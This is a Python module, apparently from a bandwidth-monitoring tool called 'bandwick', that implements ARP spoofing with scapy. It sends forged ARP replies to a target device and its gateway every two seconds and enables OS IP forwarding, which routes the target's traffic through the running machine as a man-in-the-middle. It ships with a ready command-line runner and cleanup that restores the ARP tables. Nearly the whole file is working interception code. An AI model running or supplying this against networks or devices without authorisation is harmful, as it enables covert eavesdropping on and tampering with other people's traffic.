"""
bandwick.spoof

ARP spoofing (cache poisoning) to route a target device's traffic through
this machine, so it can be monitored and, later, bandwidth-shaped.

Requires root/admin privileges (same as discovery.py). While active, this
also needs OS-level IP forwarding turned on -- handled automatically on
Linux and macOS, and flagged for manual setup on Windows (see IPForwarding
below).

Safety net: whatever happens -- a clean stop(), a `with` block exiting
normally or via exception, Ctrl+C, or a SIGTERM -- both devices' ARP
tables are restored to their real mappings and IP forwarding is reverted.
An `atexit` hook is also registered as a last-resort backstop. Only a hard
kill (SIGKILL / power loss) can skip this, which is a real limitation of
ARP spoofing in general, not just this module -- both machines' ARP
caches will self-correct anyway once entries expire (typically well
under a minute).

Usage:
    from bandwick.spoof import ArpSpoofer

    with ArpSpoofer(target_ip="192.168.1.42", gateway_ip="192.168.1.1") as spoofer:
        spoofer.start()
        ...  # monitoring/shaping work happens here while this block runs
    # ARP tables and IP forwarding are automatically restored on exit
"""

from __future__ import annotations

import atexit
import platform
import signal
import subprocess
import sys
import threading
from typing import Optional

from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, srp


def get_mac(ip: str, timeout: int = 3) -> Optional[str]:
    """Resolves the MAC address for a given IP via a direct ARP request."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered, _ = srp(broadcast / arp_request, timeout=timeout, verbose=False)
    for _, received in answered:
        return received.hwsrc
    return None


class IPForwarding:
    """
    Enables OS-level IP forwarding for the duration of use and restores
    whatever the original setting was afterward. Without this, a spoofed
    device's traffic would be intercepted but never actually delivered --
    a silent outage rather than a MITM.
    """

    def __init__(self) -> None:
        self._original: Optional[str] = None
        self._system = platform.system()

    def enable(self) -> None:
        if self._system == "Linux":
            self._original = subprocess.check_output(
                ["sysctl", "-n", "net.ipv4.ip_forward"], text=True
            ).strip()
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
        elif self._system == "Darwin":
            self._original = subprocess.check_output(
                ["sysctl", "-n", "net.inet.ip.forwarding"], text=True
            ).strip()
            subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=1"], check=True)
        elif self._system == "Windows":
            print(
                "IP forwarding on Windows isn't toggled automatically here -- "
                "enable it first with (as Administrator):\n"
                "  netsh interface ipv4 set global forwarding=enabled",
                file=sys.stderr,
            )

    def restore(self) -> None:
        if self._original is None:
            return
        if self._system == "Linux":
            subprocess.run(
                ["sysctl", "-w", f"net.ipv4.ip_forward={self._original}"], check=False
            )
        elif self._system == "Darwin":
            subprocess.run(
                ["sysctl", "-w", f"net.inet.ip.forwarding={self._original}"], check=False
            )
        self._original = None


class ArpSpoofer:
    """
    Poisons the ARP caches of `target_ip` and `gateway_ip` so traffic
    between them routes through this machine's network stack, and
    restores both to their real mappings when stopped.
    """

    def __init__(self, target_ip: str, gateway_ip: str, interval: float = 2.0) -> None:
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interval = interval

        self.my_mac = get_if_hwaddr(conf.iface)

        target_mac = get_mac(target_ip)
        if target_mac is None:
            raise RuntimeError(f"Could not resolve MAC address for target {target_ip}")
        self.target_mac = target_mac

        gateway_mac = get_mac(gateway_ip)
        if gateway_mac is None:
            raise RuntimeError(f"Could not resolve MAC address for gateway {gateway_ip}")
        self.gateway_mac = gateway_mac

        self._forwarding = IPForwarding()
        self._thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()

        atexit.register(self.stop)
        try:
            signal.signal(signal.SIGTERM, self._handle_signal)
        except ValueError:
            # signal() only works in the main thread -- fine, atexit still covers us.
            pass

    def _handle_signal(self, signum, frame) -> None:
        self.stop()
        raise SystemExit(0)

    def _poison_once(self) -> None:
        # Tell the target: "I am the gateway."
        send(
            ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac,
                psrc=self.gateway_ip, hwsrc=self.my_mac),
            verbose=False,
        )
        # Tell the gateway: "I am the target."
        send(
            ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                psrc=self.target_ip, hwsrc=self.my_mac),
            verbose=False,
        )

    def _restore_once(self) -> None:
        # Tell each side the other's *real* MAC, a few times for reliability
        # since these are unsolicited, fire-and-forget packets.
        send(
            ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac,
                psrc=self.gateway_ip, hwsrc=self.gateway_mac),
            count=3, verbose=False,
        )
        send(
            ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                psrc=self.target_ip, hwsrc=self.target_mac),
            count=3, verbose=False,
        )

    def _loop(self) -> None:
        while not self._stop_event.is_set():
            self._poison_once()
            self._stop_event.wait(self.interval)

    def start(self) -> None:
        if self._thread is not None:
            return
        self._forwarding.enable()
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        if self._thread is None:
            return
        self._stop_event.set()
        self._thread.join(timeout=self.interval + 1)
        self._thread = None
        self._restore_once()
        self._forwarding.restore()

    def __enter__(self) -> "ArpSpoofer":
        return self

    def __exit__(self, *exc_info) -> None:
        self.stop()


if __name__ == "__main__":
    import argparse
    import time

    parser = argparse.ArgumentParser(
        description="ARP-spoof a target device to route its traffic through this machine."
    )
    parser.add_argument("target_ip", help="IP address of the device to intercept")
    parser.add_argument("gateway_ip", help="IP address of the network's gateway/router")
    parser.add_argument(
        "--interval", type=float, default=2.0,
        help="Seconds between re-poisoning packets (default: 2.0)",
    )
    args = parser.parse_args()

    print(f"Resolving MAC addresses for {args.target_ip} and {args.gateway_ip}...", file=sys.stderr)
    with ArpSpoofer(args.target_ip, args.gateway_ip, interval=args.interval) as spoofer:
        spoofer.start()
        print(
            f"Intercepting {args.target_ip} <-> {args.gateway_ip}. Press Ctrl+C to stop.",
            file=sys.stderr,
        )
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nRestoring ARP tables...", file=sys.stderr)
